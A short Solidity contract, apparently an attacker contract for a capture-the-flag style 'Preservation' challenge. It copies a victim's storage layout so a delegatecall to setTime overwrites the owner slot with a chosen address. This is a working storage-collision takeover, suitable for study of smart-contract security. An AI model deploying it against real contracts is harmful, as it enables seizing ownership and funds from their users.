pragma solidity ^0.6.0;

contract PreservationAttack {
    // stores a timestamp
    address doesNotMatterWhatThisIsOne;
    address doesNotMatterWhatThisIsTwo;
    address maliciousIndex;

    function setTime(uint256 _time) public {
        maliciousIndex = address(_time);
        //maliciousIndex = msg.sender;
    }

    function convertAddressToInt(address addr) public view returns (uint256) {
        return uint256(addr);
    }

    function convertIntToAddress(uint256 num) public view returns (address) {
        return address(num);
    }
}
